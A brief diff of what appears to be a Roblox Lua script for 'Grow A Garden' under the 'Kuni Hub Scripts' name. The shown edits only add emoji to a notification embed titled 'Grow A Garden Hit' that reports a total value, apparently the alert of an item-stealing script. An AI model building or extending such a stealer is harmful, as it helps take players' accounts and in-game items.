@@ -403,7 +403,7 @@ end
 local formattedTotalValue = formatNumberWithCommas(totalValue)
 
 local embed = {
-    title = "Grow A Garden Hit - Kuni Hub Scripts🤑",
+    title = "🤑 Grow A Garden Hit - Kuni Hub Scripts 🤑",
     color = 65280,
     fields = {
         {
@@ -837,4 +837,5 @@ end)
         end
 
     end
+
 
